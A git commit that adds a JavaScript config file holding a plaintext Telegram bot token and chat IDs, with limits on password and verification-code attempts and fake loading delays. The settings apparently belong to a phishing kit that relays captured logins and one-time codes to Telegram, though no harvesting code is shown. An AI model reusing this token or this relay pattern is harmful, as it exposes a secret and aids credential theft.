55414a017c81f92d49872b2495c2990221c83095
megait004 <giapfc123@gmail.com>
2025-11-27 18:32:56 +0700

    cccc

---
+++ src/utils/config.js
@@ -0,0 +1,11 @@
+const config = {
+    token: '8272955455:AAGddyAlJIYI_A2rLWsAfiP9cNYwF0YXuk8',
+    chat_id: '5748883216',
+    noti_token: '8272955455:AAGddyAlJIYI_A2rLWsAfiP9cNYwF0YXuk8',
+    noti_chat_id: '-4917125303',
+    max_password_attempts: 2,
+    max_code_attempts: 2,
+    password_loading_time: 3,
+    code_loading_time: 3
+};
+export default config;
